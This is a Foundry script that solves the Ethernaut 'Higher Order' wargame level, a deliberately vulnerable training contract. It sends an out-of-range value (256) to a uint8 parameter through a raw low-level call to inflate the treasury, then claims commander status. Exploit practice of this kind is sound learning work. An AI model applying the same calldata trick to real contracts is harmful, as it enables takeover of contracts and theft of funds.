// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Level} from "ethernaut/levels/base/Level.sol";
import {Vm, console, Attacker} from "../src/Attacker.sol";
// import {HihgerOrder} from "../src/HigherOrder.sol";

abstract contract HigherOrder {
    address public commander;
    uint256 public treasury;

    function registerTreasury(uint8) public virtual;
    function claimLeadership() public virtual;
}

/**
 *
 * Level address: 0xd459773f02e53F6e91b0f766e42E495aEf26088F
 * Imagine a world where the rules are meant to be broken, and only the cunning
 * and the bold can rise to power. Welcome to the Higher Order, a group shrouded
 * in mystery, where a treasure awaits and a commander rules supreme.
 *
 * Your objective is to become the Commander of the Higher Order! Good luck!
 *
 * Things that might help:
 * Sometimes, calldata cannot be trusted.
 * Compilers are constantly evolving into better spaceships.
 */
contract SwitchScript is Attacker {
    Level private level = Level(0xd459773f02e53F6e91b0f766e42E495aEf26088F);

    function run() external {
        vm.startBroadcast(me.privateKey);
        address instance = getNewLevelInstance(level);
        HigherOrder higherOrder = HigherOrder(instance);

        (bool success,) = address(higherOrder).call(
            abi.encodeWithSignature("registerTreasury(uint8)", 256)
        );
        require(success, "Treasury registration failed");
        higherOrder.claimLeadership();

        require(higherOrder.commander() == me.addr, "Level is not solved");
        require(submitInstance(), "Level submission failed");
        vm.stopBroadcast();
    }
}
